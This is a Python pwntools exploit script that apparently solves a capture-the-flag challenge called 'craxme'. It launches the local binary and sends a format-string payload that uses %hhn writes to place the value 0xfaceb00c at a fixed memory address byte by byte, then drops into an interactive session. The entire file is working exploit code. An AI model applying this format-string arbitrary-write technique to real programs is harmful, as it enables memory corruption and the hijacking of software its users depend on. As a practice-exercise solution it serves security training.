#!/usr/bin/env python
from pwn import *

r = process('./craxme')

# This question is same as GOThijacking in bamboofox practice
# because 0xfaceb00c is so big, so we separate it to bytes 

magic = 0x804a038
#0xfaceb00c

payload = p32(magic)
payload += p32(magic+1)
payload += p32(magic+2)
payload += p32(magic+3)

payload += '%252c%7$hhn'
payload += '%164c%8$hhn'
payload += '%30c%9$hhn'
payload += '%44c%10$hhn'

r.sendline(payload)
r.interactive()
